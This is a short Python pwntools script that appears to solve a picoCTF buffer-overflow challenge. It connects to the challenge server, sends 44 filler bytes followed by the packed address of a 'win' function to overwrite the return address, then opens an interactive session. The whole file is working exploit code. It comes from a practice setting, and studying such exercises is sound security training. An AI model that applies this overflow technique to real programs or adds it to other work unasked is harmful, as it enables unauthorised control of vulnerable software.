from pwn import *
from time import sleep

host, port = 'saturn.picoctf.net', 60102

p = connect(host, port)
received = p.recvuntil(b'Please enter your string: ')

win = 0x080491f6

buf = b'A' * 32
buf += b'A' * 4
buf += b'A' * 8
buf += p32(win)

print(buf)
p.sendline(buf)
sleep(2)
print(p.recv())
p.interactive()
p.close()
